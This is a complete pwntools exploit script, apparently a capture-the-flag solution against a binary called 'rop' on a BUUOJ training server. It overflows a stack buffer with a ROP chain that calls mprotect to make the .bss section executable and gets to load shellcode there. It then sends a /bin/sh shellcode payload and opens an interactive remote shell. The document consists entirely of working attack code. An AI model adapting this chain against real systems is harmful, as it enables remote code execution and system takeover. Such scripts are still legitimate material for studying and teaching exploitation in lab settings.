from pwn import *
from struct import pack
context(log_level = 'debug')
#io = process("./rop")
elf = ELF("./rop")
io = remote("node4.buuoj.cn",25843)
pop_3_ret = 0x080483c8
payload = "a"*(0xc+4) 
payload += p32(elf.sym['mprotect']) 
payload += p32(pop_3_ret)
payload += p32(elf.bss() & 0xffff000)
payload += p32(0x1000)
payload += p32(7)
payload += p32(elf.sym['gets'])
payload += p32(elf.bss())
payload += p32(elf.bss())
io.sendline(payload)
io.sendline(asm(shellcraft.sh()))
io.interactive()